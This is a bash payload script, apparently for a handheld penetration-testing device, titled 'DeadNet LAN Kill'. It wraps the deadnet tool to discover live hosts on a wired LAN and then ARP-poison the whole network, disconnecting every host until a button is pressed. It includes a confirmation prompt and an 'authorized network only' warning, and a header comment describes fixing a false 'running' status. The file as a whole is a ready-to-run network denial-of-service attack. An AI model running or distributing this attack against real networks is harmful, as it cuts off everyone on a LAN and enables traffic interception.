#!/bin/bash
# Title: DeadNet LAN Kill
# Author: florian (payload) / flashnuke (deadnet - https://github.com/flashnuke/deadnet)
# Description: Discovers live LAN hosts, then ARP-poisons the whole wired LAN (eth1) to disconnect them. Press B to stop.
# Version: 4.0
#
# Needs: python3, scapy (opkg install -d mmc scapy), nmap (pre-installed) for discovery
# IMPORTANT: only run against a network you are authorized to test.
#
# BUG FOUND AND FIXED (deadnet.sh/deadnet_lan_kill were previously excluded
# from bug-hunt/improve passes as "good enough" - re-scoped in per user
# request; a backup of the pre-improvement versions is kept at
# backups/Deadnet_lan_old.sh and backups/deadnet_lan_kill_payload_old.sh):
# v3.0 backgrounded deadnet.sh itself with a plain `&` (deadnet.sh had no
# --background flag at all despite its own header comment claiming it did)
# - no PIDFILE, no liveness check, so a failed launch (missing scapy, a bad
# interface) still showed "LAN kill running - press B to stop" unconditionally,
# the exact "black box, no feedback" class this toolkit's every other
# background-launching payload (bluetooth_jam, wifi_deauth, packet_tracer)
# already fixed for itself. deadnet.sh now has a real --background flag
# (PIDFILE + pid_running(), single-instance protection) - this payload uses
# it properly instead of working around its absence.

LOG "Starting DeadNet LAN kill (eth1)..."

if ! CONFIRMATION_DIALOG "ARP-poison the WHOLE LAN? Authorized network only!"; then
    LOG "User cancelled."
    exit 0
fi

if [ ! -x /root/scripts/deadnet.sh ]; then
    ERROR_DIALOG "deadnet.sh not found - run the toolkit setup.py first."
    exit 1
fi

LOG "Discovering live hosts on the LAN first..."
DISCOVERY=$(/root/scripts/deadnet.sh --discover --iface eth1 -y 2>&1)
LOG "$DISCOVERY"

# deadnet.sh --background now verifies its own launch internally (same
# "sleep briefly, check is_running, die honestly" pattern deauth.sh/
# bluetooth.sh/sniff.sh already use for --background) and returns a real
# exit code - matching how wifi_deauth/bluetooth_jam already check theirs,
# no separate follow-up --status check needed here.
if ! /root/scripts/deadnet.sh --iface eth1 --no-discover --background -y; then
    ERROR_DIALOG "LAN kill did not start - check /tmp/pager-deadnet.log (missing python3/scapy is the likely cause) and try again."
    exit 1
fi

ALERT "LAN kill running - press B to stop"
LOG "Press B on the device to stop the LAN kill"
WAIT_FOR_BUTTON_PRESS B

/root/scripts/deadnet.sh --stop
LOG "LAN kill stopped."
ALERT "LAN kill stopped"
